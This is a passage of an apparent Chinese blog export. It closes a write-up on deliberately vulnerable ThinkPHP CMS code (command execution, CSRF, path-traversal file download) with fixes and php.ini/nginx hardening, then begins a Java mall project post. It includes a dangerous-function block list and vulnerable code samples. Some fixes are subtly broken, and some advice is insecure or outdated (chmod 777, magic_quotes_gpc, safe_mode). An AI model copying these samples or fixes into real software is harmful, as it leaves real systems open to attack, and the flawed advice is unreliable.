         <span class="hljs-variable">$ip</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;data&#x27;</span>);
         <span class="hljs-variable">$ip</span> = trim(<span class="hljs-variable">$ip</span>);
         <span class="hljs-variable">$ip</span> = escapeshellcmd(<span class="hljs-variable">$ip</span>);
         <span class="hljs-variable">$ip</span> = escapeshellarg(<span class="hljs-variable">$ip</span>);

<span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;
         <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$ip</span>) &amp;&amp; <span class="hljs-variable">$ip</span> !== <span class="hljs-string">&#x27;&#x27;</span>)
         &#123;
             <span class="hljs-variable">$result</span> = shell_exec(<span class="hljs-string">&#x27;ping &#x27;</span>.<span class="hljs-variable">$ip</span>);
             <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$result</span>&lt;/pre&gt;&quot;</span>;
         &#125;
     &#125;</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420163850706.png" alt="image-20210420163850706" style="zoom:67%;">

<h2 id="10-CSRF"><a href="#10-CSRF" class="headerlink" title="10.CSRF"></a>10.CSRF</h2><h3 id="漏洞点一-9"><a href="#漏洞点一-9" class="headerlink" title="漏洞点一"></a><strong>漏洞点一</strong></h3><h4 id="代码分析-14"><a href="#代码分析-14" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>application\member\controller\Member.php</code>中的<code>jifen</code>方法</p>
<h4 id="漏洞防御-15"><a href="#漏洞防御-15" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>首先在前端代码中加入<code>&#123;:token&#125;</code>，让用户每次访问时都携带一个随机token，再在后端页面中检查该token是否正确</p>
<pre><code class="hljs php">
<span class="hljs-variable">$token</span> = [<span class="hljs-string">&#x27;__token__&#x27;</span>=&gt; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;__token__&#x27;</span>]];
         <span class="hljs-comment">// 设置检查规则</span>
         <span class="hljs-variable">$rule</span> = [
             <span class="hljs-string">&#x27;__token__&#x27;</span>    =&gt; <span class="hljs-string">&#x27;require|token&#x27;</span>,
         ];
         <span class="hljs-comment">// 利用validata函数检查</span>
         <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;validate(<span class="hljs-variable">$token</span>, <span class="hljs-variable">$rule</span>);
         <span class="hljs-comment">// token检查不通过则直接退出，并警告站点不安全。</span>
         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> !== <span class="hljs-literal">true</span>)&#123;
             <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;website is unsafe!&quot;</span>);
         &#125;</code></pre>



<h3 id="漏洞点二，三，四"><a href="#漏洞点二，三，四" class="headerlink" title="漏洞点二，三，四"></a><strong>漏洞点二，三，四</strong></h3><h4 id="代码分析-15"><a href="#代码分析-15" class="headerlink" title="代码分析"></a>代码分析</h4><p>代码位置<code>application\member\controller\Member.php</code>中的<code>edit</code>方法 </p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">edit</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">   </span>&#123;
       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
           <span class="hljs-variable">$userid</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;param(<span class="hljs-string">&#x27;id/d&#x27;</span>, <span class="hljs-number">0</span>);
           <span class="hljs-variable">$data</span>   = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post();
           <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;validate(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;member.edit&#x27;</span>);

           <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> !== <span class="hljs-variable">$result</span>) &#123;
               <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$result</span>);
           &#125;
           ...</code></pre>

<p>上面的代码只是对提交的数据进行了检查，数据符合规则就会成功，但是没有对请求的来源做任何的检查，这也是做成CSRF漏洞的最大原因。</p>
<h4 id="漏洞防御-16"><a href="#漏洞防御-16" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>CSRF漏洞的防御</p>
<ul>
<li>设置token，与管理员登录页面一样，每次请求的前端页面都会隐藏一个随机产生的token，而在提交请求时这个token也会发送到后端，此时服务器会检查，提交的token是否正确，只有正确时才会进行下一步操作。</li>
<li>referer代表着请求的来源，不可以伪造。但是浏览器可以关闭referer。</li>
<li>禁止第三方网站使用本站Cookie。但是只有个别的浏览器支持。</li>
</ul>
<p>所以这里选择使用token，修复该漏洞。</p>
<p>前端代码</p>
<p>基本不需要修改，只需要增加一个隐藏的token值，代码位置<code>application\member\view\member\edit.html</code></p>
<p>此时的前端页面就会产生一个新标签，就是token值</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408161709609.png" alt="image-20210408161709609" style="zoom:67%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408161749800.png" alt="image-20210408161749800" style="zoom: 67%;"></p>
<p>后端代码</p>
<p><code>application\member\controller\Member.php</code>中的<code>edit</code>方法 </p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">edit</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">   </span>&#123;
       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
           <span class="hljs-variable">$userid</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;param(<span class="hljs-string">&#x27;id/d&#x27;</span>, <span class="hljs-number">0</span>);
           <span class="hljs-variable">$data</span>   = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post();
         
		<span class="hljs-comment">// 获取前端的token值</span>
           <span class="hljs-variable">$token</span> = [<span class="hljs-string">&#x27;__token__&#x27;</span>=&gt; <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;__token__&#x27;</span>]];
           <span class="hljs-comment">// 设置检查规则</span>
           <span class="hljs-variable">$rule</span> = [
               <span class="hljs-string">&#x27;__token__&#x27;</span>    =&gt; <span class="hljs-string">&#x27;require|token&#x27;</span>,
           ];
           <span class="hljs-comment">// 利用validata函数检查</span>
           <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;validate(<span class="hljs-variable">$token</span>, <span class="hljs-variable">$rule</span>);
           <span class="hljs-comment">// token检查不通过则直接退出，并警告站点不安全。</span>
           <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> !== <span class="hljs-literal">true</span>)&#123;
               <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;website is unsafe!&quot;</span>);
           &#125;
           <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;validate(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;member.edit&#x27;</span>);

           <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> !== <span class="hljs-variable">$result</span>) &#123;
               <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$result</span>);
           &#125;
           ...</code></pre>

<p>再使用bp抓包生成CSRF的poc，此时就不能成功了</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408162254519.png" alt="image-20210408162254519" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408160213558.png" alt="image-20210408160213558" style="zoom: 50%;"></p>
<h2 id="11-任意文件下载-1"><a href="#11-任意文件下载-1" class="headerlink" title="11.任意文件下载"></a>11.任意文件下载</h2><h3 id="代码分析-16"><a href="#代码分析-16" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码位于<code>application\download\controller\Index.php</code>中的index方法</p>
<pre><code class="hljs php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">  </span>&#123;
header(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);
      <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;request-&gt;isGet() &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] !== <span class="hljs-literal">null</span>)&#123;
          <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] !== <span class="hljs-string">&#x27;&#x27;</span>)&#123;
              <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];
              <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;nba/&quot;</span>.<span class="hljs-variable">$filename</span>;
              iconv(<span class="hljs-string">&quot;utf-8&quot;</span>,<span class="hljs-string">&quot;gb2312&quot;</span>,<span class="hljs-variable">$filename</span>);
              <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$filename</span>))&#123;
                  <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;文件不存在！&quot;</span>);
              &#125;
              <span class="hljs-variable">$fp</span> = fopen(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;rb&#x27;</span>);
              <span class="hljs-variable">$file_size</span> = filesize(<span class="hljs-variable">$filename</span>);
              ob_clean();
              Header(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);
              Header(<span class="hljs-string">&quot;Accept-Ranges: bytes&quot;</span>);
              Header(<span class="hljs-string">&quot;Accept-Length:&quot;</span>.<span class="hljs-variable">$file_size</span>);
              Header(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=&quot;</span>.basename(<span class="hljs-variable">$filename</span>));
              <span class="hljs-variable">$buffer</span>=<span class="hljs-number">1024</span>;
              <span class="hljs-variable">$file_count</span>=<span class="hljs-number">0</span>;
              <span class="hljs-keyword">while</span>(!feof(<span class="hljs-variable">$fp</span>) &amp;&amp; <span class="hljs-variable">$file_count</span>&lt;<span class="hljs-variable">$file_size</span>)&#123;
                  <span class="hljs-variable">$file_con</span>=fread(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$buffer</span>);
                  <span class="hljs-variable">$file_count</span>+=<span class="hljs-variable">$buffer</span>;
                  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file_con</span>;
              &#125;
              fclose(<span class="hljs-variable">$fp</span>);
              <span class="hljs-keyword">return</span> view();
          &#125;
      &#125;

      <span class="hljs-keyword">return</span> view();
  &#125;</code></pre>

<p>这里就是实现了一个图片下载的方法，使得用户可以下载<code>public/nba</code>文件夹下的图片，但是并没有对提交的<code>filename</code>参数进行检查和过滤，那么攻击者就可以利用<code>../</code>实现目录的跳转，从而可以下载任意文件</p>
<h3 id="漏洞防御-17"><a href="#漏洞防御-17" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>主要的防御方法就是限制用户输入的文件名在程序指定的目录下，那么就是不能使用<code>../</code>进行目录的跳转，并且对用户下载的文件后缀名进行检查</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_file</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;
    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-variable">$filename</span>))&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;hacker!&quot;</span>);
    &#125;
    <span class="hljs-comment">// 获取文件的MIME 检查是否符合图片类型的要求</span>
    <span class="hljs-variable">$file_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-variable">$filename</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_type</span> !== <span class="hljs-string">&#x27;image/jpeg&#x27;</span> || <span class="hljs-variable">$file_type</span> !== <span class="hljs-string">&#x27;image/png&#x27;</span>|| <span class="hljs-variable">$file_type</span> !== <span class="hljs-string">&#x27;image/gif&#x27;</span>)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;hacker!&quot;</span>);
    &#125;
&#125;</code></pre>



<h2 id="12-unserialize-1"><a href="#12-unserialize-1" class="headerlink" title="12.unserialize"></a>12.unserialize</h2><p>由于这里的反序列化漏洞是一个ctf题目，如果修复了就失去了它了存在的意义，所以这里没有修复方法。但是针对于一般的unserilize，还是有很多防御方法的。</p>
<ul>
<li>1.严格的把控 unserailize() 函数的参数，不要给攻击者任何输入的可能</li>
<li>2.在文件系统函数的参数可控时，对参数进行严格的过滤。</li>
<li>3.严格检查上传文件的内容，而不是只检查文件头。</li>
<li>4.在条件允许的情况下禁用可执行系统命令、代码的危险函数。</li>
</ul>
<p>而对于这种框架类型的网站,则需要开发者注意使用安全的网站架构,发现漏洞后需要及时修复漏，并且不安全的序列化后的对象，减少使用<code>system,eval</code>等可能被攻击者利用的函数。</p>
<h2 id="13-服务器安全配置防御漏洞"><a href="#13-服务器安全配置防御漏洞" class="headerlink" title="13.服务器安全配置防御漏洞"></a>13.服务器安全配置防御漏洞</h2><h3 id="php-ini配置"><a href="#php-ini配置" class="headerlink" title="php.ini配置"></a>php.ini配置</h3><ul>
<li><p><strong>禁止使用的PHP危险函数：</strong>Web木马程序通常利用php的特殊函数执行系统命令，查询任意目录文件，增加修改删除文件等。php木马程序常使用的函数为：dl,assert,exec,popen,system,passthru,shell_exec等</p>
<p>在php.ini中添加如下的内容：</p>
<pre><code class="hljs hsp">disable_functions = dl,<span class="hljs-keyword">assert</span>,<span class="hljs-keyword">exec</span>,popen,<span class="hljs-keyword">system</span>,passthru,shell_exec,proc_close,proc_open,pcntl_exec</code></pre>
</li>
<li><p><strong>关闭注册全局变量：</strong>在PHP中提交的变量，包括使用POST或者GET提交的变量，会自动注册为全局变量，能够直接访问，这是对服务器非常不安全的，所以不能让它注册为全局变量，就把注册全局变量选项关闭。</p>
<p>关闭注册<strong>全局变量</strong>设置：</p>
<pre><code class="hljs ini"><span class="hljs-attr">register_globals</span>  = <span class="hljs-literal">Off</span></code></pre>



</li>
</ul>
<ul>
<li><p><strong>开启magic_quotes_gpc</strong>：magic_quotes_gpc会把引用的数据中包含单引号’和双引号”以及反斜线 \自动加上反斜线，自动转译符号，确保数据操作的正确运行，magic_quotes_gpc的设定值将会影响通过Get/Post/Cookies获得的数据，可以有效的防止SQL注入漏洞。</p>
<p>打开magic_quotes_gpc设置：</p>
<pre><code class="hljs ini"><span class="hljs-attr">magic_quotes_gpc</span> = <span class="hljs-literal">On</span></code></pre>
</li>
<li><p><strong>关闭错误消息显示：</strong>php在没有连接到数据库或者其他情况下会有提示错误，一般错误信息中会包含php脚本当前的路径信息或者查询的SQL语句等信息，这类信息提供给黑客后，是不安全的，所以服务器建议禁止错误提示。</p>
<p>关闭错误信息显示设置：</p>
<pre><code class="hljs ini"><span class="hljs-attr">display_errors</span> = <span class="hljs-literal">Off</span></code></pre>
</li>
<li><p><strong>禁止访问远程文件:</strong>允许访问URL远程资源使得PHP应用程序的漏洞变得更加容易被利用，php脚本若存在远程文件包含漏洞可以让攻击者直接获取网站权限及上传web木马</p>
<p>配置如下：</p>
<pre><code class="hljs ini"><span class="hljs-attr">allow_url_fopen</span> =  <span class="hljs-literal">Off</span>
<span class="hljs-attr">allow_url_include</span> = <span class="hljs-literal">Off</span></code></pre>
</li>
<li><p><strong>开启php安全模式：</strong>php的安全模式是个非常重要的内嵌的安全机制，能够控制一些php中的函数，比如system()，同时把很多文件操作函数进行了权限控制，也不允许对某些关键文件的读取。</p>
<pre><code class="hljs ini"><span class="hljs-attr">safe_mode</span> = <span class="hljs-literal">On</span></code></pre>



</li>
</ul>
<h3 id="nginx服务器安全配置"><a href="#nginx服务器安全配置" class="headerlink" title="nginx服务器安全配置"></a>nginx服务器安全配置</h3><p>修改<code>nginx.conf</code></p>
<ul>
<li><p>禁止敏感文件的直接访问，可以有效的防御文件上传攻击，修改server段</p>
<pre><code class="hljs coq">location ~ ^/(uploads|<span class="hljs-type">static</span>)/.*.(php|<span class="hljs-type">php3</span>|<span class="hljs-type">php4</span>|<span class="hljs-type">php5</span>|<span class="hljs-type">cgi</span>|<span class="hljs-type">asp</span>|<span class="hljs-type">aspx</span>|<span class="hljs-type">jsp</span>|<span class="hljs-type">shtml</span>|<span class="hljs-type">shtm</span>|<span class="hljs-type">pl</span>|<span class="hljs-type">cfm</span>|<span class="hljs-type">sql</span>|<span class="hljs-type">mdb</span>|<span class="hljs-type">dll</span>|<span class="hljs-type">exe</span>|<span class="hljs-type">com</span>|<span class="hljs-type">inc</span>|<span class="hljs-type">sh</span>)$ &#123;
   deny all;
&#125;</code></pre>
</li>
<li><p>禁止危险IP的访问</p>
<pre><code class="hljs awk"><span class="hljs-regexp">//</span>禁止的写法
deny <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span>;
 
<span class="hljs-regexp">//</span>允许的写法
allow <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span>; 
deny all;</code></pre>
</li>
<li><p>隐藏版本信息</p>
<pre><code class="hljs nginx"><span class="hljs-attribute">server_tokens</span>   <span class="hljs-literal">off</span>;
<span class="hljs-attribute">proxy_hide_header</span>        X-Powered-By</code></pre>



</li>
</ul>
<h3 id="代码安全"><a href="#代码安全" class="headerlink" title="代码安全"></a>代码安全</h3><ul>
<li>config/app.php中的app_debug和app_trace设置false，关闭调试模式</li>
<li>默认是域名绑定在public目录，为唯一对外访问目录</li>
<li>务必更改默认密码，并不要设置的过于简单，防止暴力破解</li>
<li>后台禁止访问IP，可以在设置-网站设置中设置</li>
</ul>
<h1 id="问题与总结"><a href="#问题与总结" class="headerlink" title="问题与总结"></a>问题与总结</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
<li>数据库连接失败</li>
</ul>
<pre><code class="hljs apache"><span class="hljs-attribute">SQLSTATE</span>[HYO<span class="hljs-number">00</span>][<span class="hljs-number">2002</span>] Connection refused</code></pre>

<p>解决方法如下</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210311195551767.png" alt="image-20210311195551767"></p>
<ul>
<li>数据库关闭</li>
</ul>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210311200511035.png" alt="image-20210311200511035" style="zoom: 67%;">



<p>上面的错误是mysql数据库的容器关闭导致</p>
<p>但是重启时还是立即关闭</p>
<p>查看日志看到如下内容，百度解决</p>
<pre><code class="hljs vim">root@sunzy-virtual-machine:~# docker logs -<span class="hljs-keyword">f</span> <span class="hljs-number">250</span>c80740b5b
Warnin<span class="hljs-variable">g:</span> World-writable config <span class="hljs-keyword">file</span> <span class="hljs-string">&#x27;/etc/mysql/conf.d/my.cnf&#x27;</span> <span class="hljs-keyword">is</span> ignored
Warnin<span class="hljs-variable">g:</span> World-writable config <span class="hljs-keyword">file</span> <span class="hljs-string">&#x27;/etc/mysql/conf.d/my.cnf&#x27;</span> <span class="hljs-keyword">is</span> ignored
Warnin<span class="hljs-variable">g:</span> World-writable config <span class="hljs-keyword">file</span> <span class="hljs-string">&#x27;/etc/mysql/conf.d/my.cnf&#x27;</span> <span class="hljs-keyword">is</span> ignored</code></pre>

<p>将mysql文件夹中的my.cnf的权限改为 644 </p>
<pre><code class="hljs apache"><span class="hljs-attribute">chmon</span> <span class="hljs-number">644</span> my.cnf</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210311203031485.png" alt="image-20210311203031485"></p>
<ul>
<li>网站的图片无法显示或者css,js代码无法执行</li>
</ul>
<p>进入nginx服务器的容器内</p>
<pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> 容器名 bash</code></pre>

<p>cd 进入图片或者css js代码保存的文件夹</p>
<p>使用chmod改变权限</p>
<pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> -R <span class="hljs-number">777</span> 文件夹  # -R  参数是递归改变权限 即文件夹内的文件都有<span class="hljs-number">777</span> 的权限</code></pre>



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>提高了自己的动手能力，以及编程能力，加深了对thinkPHP框架的了解，明白了其运行原理，学会了如何编辑一个CMS网站</li>
<li>在编写漏洞的过程中也提高了自己对改漏洞的理解，在以后的学习和工作中能更好的利用和防御漏洞</li>
<li>锻炼了自己的学习能力，从一开始的无从下手，后来通过手册学习后，了解了网站的框架，到后来可以自如的修改网站的页面和后端逻辑代码，对自己的学习能力提升很大，这也是这门课程的重要意义。毕竟学习安全，很多东西是需要自己摸索的，具备独立学习的能力才能在安全的道路上走的更远。</li>
</ul>
]]></content>
      <tags>
        <tag>thinkPHP,cms</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/07/10/fmmall/</url>
    <content><![CDATA[<p>商城项目</p>
<p>项目地址：<a href="https://github.com/sunzhengyu99/fmmall/tree/master">https://github.com/sunzhengyu99/fmmall/tree/master</a></p>
<p>体验地址：<a href="http://www.fmmall.top/">http://www.fmmall.top/</a></p>
<h2 id="1-业务逻辑开发"><a href="#1-业务逻辑开发" class="headerlink" title="1.业务逻辑开发"></a>1.业务逻辑开发</h2><h3 id="1-1登录注册"><a href="#1-1登录注册" class="headerlink" title="1.1登录注册"></a>1.1登录注册</h3><p>1.1.1 完成dao操作</p>
<ol>
<li><p>创建实体类</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.entity;

<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;
<span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> lombok.NoArgsConstructor;

<span class="hljs-keyword">import</span> java.sql.Date;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Users</span> </span>&#123;
    <span class="hljs-keyword">private</span> Integer userId;
    <span class="hljs-keyword">private</span> String username;
    <span class="hljs-keyword">private</span> String password;
    <span class="hljs-keyword">private</span> String nickname;
    <span class="hljs-keyword">private</span> String realname;
    <span class="hljs-keyword">private</span> String userImg;
    <span class="hljs-keyword">private</span> String userMobile;
    <span class="hljs-keyword">private</span> String userEmail;
    <span class="hljs-keyword">private</span> String userSex;
    <span class="hljs-keyword">private</span> Date userBirth;
    <span class="hljs-keyword">private</span> Date userRegtime;
    <span class="hljs-keyword">private</span> Date userModtime;
&#125;
</code></pre>



</li>
</ol>
<ol start="2">
<li><p>编写UserDao文件</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.dao;

<span class="hljs-keyword">import</span> com.sunzy.fmmall.entity.User;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.entity.Users;
<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Mapper;

<span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserDao</span> </span>&#123;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">queryUserByName</span><span class="hljs-params">(String name)</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">insertUser</span><span class="hljs-params">(Users user)</span></span>;
&#125;
</code></pre>



</li>
</ol>
<ol start="3">
<li><p>编写UserMapper.xml</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">mapper</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.dao.UserDao&quot;</span>&gt;</span>


  <span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.Users&quot;</span>&gt;</span>
    <span class="hljs-comment">&lt;!--</span>
<span class="hljs-comment">      WARNING - @mbg.generated</span>
<span class="hljs-comment">    --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;username&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;password&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;nickname&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;nickname&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;realname&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;realname&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_img&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userImg&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_mobile&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userMobile&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_email&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userEmail&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_sex&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;CHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userSex&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_birth&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DATE&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userBirth&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_regtime&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userRegtime&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_modtime&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userModtime&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insertUser&quot;</span>&gt;</span>
    insert into users(username, password, user_img, user_regtime, user_modtime)
    values(#&#123;username&#125;, #&#123;password&#125;,#&#123;userImg&#125;, #&#123;userRegtime&#125;,#&#123;userModtime&#125;)
  <span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span>
